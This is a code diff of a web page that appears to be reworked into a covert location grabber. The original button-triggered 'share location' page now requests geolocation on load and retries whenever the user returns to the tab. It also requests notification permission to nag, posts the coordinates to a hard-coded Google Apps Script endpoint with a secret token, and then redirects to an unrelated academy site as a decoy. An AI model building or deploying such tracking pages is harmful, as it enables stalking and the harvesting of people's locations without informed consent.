@@ -8,41 +8,193 @@
 </head>
 <body>
   <h2>Send Location to Google Sheet</h2>
-  <p id="status">Press the button to share location.</p>
-  <button id="sendBtn">Get location & send</button>
+  <p id="status">Requesting location permission...</p>
+  <button id="continueBtn" style="display:none; padding:10px 14px; font-size:16px;">Click here to continue</button>
 
   <script>
     // ----- CONFIG -----
     const APPS_SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbwV9b3Mt776QU1OfdjNWJMaYV3sxPGQOyL49Nu-0jt3Y1pcYHsz4iNER-P540RTgWJi/exec'; // e.g. https://script.google.com/macros/s/XXXXXXXXXX/exec
     const SECRET_TOKEN = 'bumblebee'; // same as SECRET in Apps Script
+  const REDIRECT_URL = 'https://thevidyaacademy.com/'; // Redirect here after success or failure
     // ------------------
 
-    const statusEl = document.getElementById('status');
-    const btn = document.getElementById('sendBtn');
+  const statusEl = document.getElementById('status');
+  const continueBtn = document.getElementById('continueBtn');
+  let retryHandle = null;
+  let geoPermissionStatus = null;
+  let tempWatchId = null; // temporary watch to better trigger prompts on mobile
+  let continueRedirectTimer = null; // fallback redirect after manual click if no success
 
-    btn.addEventListener('click', () => {
+    // Encapsulate request flow so we can trigger on load AND via button (as retry)
+    function requestAndSend() {
       statusEl.textContent = 'Requesting location permission...';
       if (!navigator.geolocation) {
-        statusEl.textContent = 'Geolocation not supported in this browser.';
+        statusEl.textContent = 'Geolocation not supported on this device/browser.';
         return;
       }
-      navigator.geolocation.getCurrentPosition(success, fail, { enableHighAccuracy: true, timeout: 20000, maximumAge: 0 });
+      const opts = { enableHighAccuracy: true, timeout: 20000, maximumAge: 0 };
+      // Regular one-shot request
+      navigator.geolocation.getCurrentPosition(success, fail, opts);
+
+      // On many mobile browsers, watchPosition can more reliably trigger the permission prompt.
+      // Start a short-lived watch if permission is in prompt/unknown state.
+      try {
+        const shouldStartWatch = !geoPermissionStatus || geoPermissionStatus.state === 'prompt';
+        if (shouldStartWatch && tempWatchId == null) {
+          tempWatchId = navigator.geolocation.watchPosition(success, function onWatchErr(e) {
+            // Swallow errors; the primary flow handles retries.
+          }, opts);
+          // Auto-clear the temporary watch after a few seconds to avoid battery drain
+          setTimeout(() => {
+            try {
+              if (tempWatchId != null) {
+                navigator.geolocation.clearWatch(tempWatchId);
+                tempWatchId = null;
+              }
+            } catch (_) {}
+          }, 15000);
+        }
+      } catch (_) {}
+    }
+
+    // Auto-start on page load to show the permission prompt immediately
+    window.addEventListener('DOMContentLoaded', async () => {
+      // Watch geolocation permission changes and auto-retry when it becomes granted
+      try {
+        if (navigator.permissions && navigator.permissions.query) {
+          const st = await navigator.permissions.query({ name: 'geolocation' });
+          geoPermissionStatus = st;
+          st.onchange = () => {
+            if (st.state === 'granted') {
+              statusEl.textContent = 'Permission granted. Trying again...';
+              clearTimeout(retryHandle);
+              requestAndSend();
+            } else if (st.state === 'prompt') {
+              statusEl.textContent = 'Please allow location when prompted.';
+            } else if (st.state === 'denied') {
+              statusEl.textContent = 'Location permission is blocked. Enable it in your browser settings for this site.';
+            }
+          };
+        }
+      } catch (_) {}
+      requestAndSend();
     });
+
+    // Manual continue button: trigger geolocation under a user gesture and set fallback redirect
+    continueBtn.addEventListener('click', () => {
+      try { continueBtn.style.display = 'none'; } catch(_){}
+      clearTimeout(continueRedirectTimer);
+      // Immediate attempt to trigger permission prompt under gesture
+      requestAndSend();
+      // If no success within a short window, redirect anyway per request
+      continueRedirectTimer = setTimeout(() => {
+        safeRedirect();
+      }, 8000);
+    });
+
+    // If the user toggles OS location and returns to the tab/app, try again automatically
+    document.addEventListener('visibilitychange', () => {
+      if (document.visibilityState === 'visible') {
+        scheduleRetry(1000);
+      }
+    });
+    window.addEventListener('focus', () => scheduleRetry(1000));
 
     function success(pos) {
       statusEl.textContent = 'Got location. Sending...';
+      // Cancel any pending manual-continue fallback redirect
+      clearTimeout(continueRedirectTimer);
+      // Clear any temporary watch we might have started to trigger the prompt
+      try {
+        if (tempWatchId != null) {
+          navigator.geolocation.clearWatch(tempWatchId);
+          tempWatchId = null;
+        }
+      } catch (_) {}
+      try { continueBtn.style.display = 'none'; } catch(_){}
+      // Keep the same send method; redirect after it resolves (or times out via internal fallback)
       sendViaForm(pos).then(r => {
         if (r && r.ok) {
-          statusEl.textContent = 'Sent successfully! Check the Google Sheet.';
+          statusEl.textContent = 'Sent successfully! Redirecting...';
         } else {
-          statusEl.textContent = 'Send may have failed. See console for details.';
+          statusEl.textContent = 'Send may have failed. Redirecting...';
           console.log('send result', r);
         }
+        safeRedirect();
       });
     }
 
     function fail(err) {
-      statusEl.textContent = 'Location error: ' + err.message;
+      // Error codes: 1 PERMISSION_DENIED, 2 POSITION_UNAVAILABLE, 3 TIMEOUT
+      const code = (err && err.code) || 0;
+      let hint = '';
+      if (code === 1) {
+        hint = 'Please allow location for this site in your browser settings.';
+      } else if (code === 2) {
+        hint = 'Please turn on device Location/GPS and ensure signal is available.';
+      } else if (code === 3) {
+        hint = 'Timed out. Move to an open area or check connectivity.';
+      }
+      statusEl.textContent = 'Location error: ' + (err && err.message ? err.message : 'Unknown') + (hint ? ' ' + hint : '');
+
+      // Ask for notification permission to nudge the user and keep them informed
+      maybeNotifyToEnableLocation(hint);
+
+      // Reveal the manual continue button so the user can trigger the prompt and/or redirect
+      try { continueBtn.style.display = 'inline-block'; } catch(_){}
+
+      // Schedule an automatic retry —
+      // If permission is granted but services are off (code 2), keep retrying.
+      // If permission is prompt/denied, we rely on the permission onchange listener.
+      // Retry if services are off/unavailable/timeout, or we don't know permission yet,
+      // or permission isn't explicitly denied (so prompt/unknown).
+      const shouldRetry = code === 2 || code === 3 || !geoPermissionStatus || geoPermissionStatus.state !== 'denied';
+      if (shouldRetry) {
+        scheduleRetry();
+      }
+    }
+
+    function scheduleRetry(delayMs = 8000) {
+      clearTimeout(retryHandle);
+      retryHandle = setTimeout(() => {
+        statusEl.textContent = 'Retrying to get location...';
+        requestAndSend();
+      }, delayMs);
+    }
+
+    async function maybeNotifyToEnableLocation(extra) {
+      try {
+        if (!('Notification' in window)) return;
+        let perm = Notification.permission;
+        if (perm === 'default') {
+          // Request permission; may be ignored on some browsers without gesture
+          perm = await Notification.requestPermission();
+        }
+        if (perm === 'granted') {
+          const body = (extra ? extra + ' ' : '') + 'After enabling, return to this page; it will retry automatically.';
+          new Notification('Turn on Location Services', { body });
+        }
+      } catch (_) {}
+    }
+
+    // Helper to perform a safe redirect with a tiny delay allowing UI updates to paint
+    function safeRedirect() {
+      setTimeout(() => {
+        try {
+          const target = (REDIRECT_URL || '').trim();
+          if (!/^https?:\/\//i.test(target)) {
+            console.warn('Invalid REDIRECT_URL, falling back to default:', target);
+            statusEl.textContent = 'Redirecting...';
+            window.location.assign('https://banudeep-portfolio.web.app/');
+            return;
+          }
+          statusEl.textContent = 'Redirecting to ' + target + ' ...';
+          window.location.assign(target);
+        } catch (e) {
+          // As a fallback, try assigning via location.replace (doesn't create history entry)
+          try { window.location.replace(REDIRECT_URL); } catch (_) {}
+        }
+      }, 200);
     }
     // Reverse geocode helper (best-effort; may return null)
     async function reverseGeocodeText(lat, lon) {
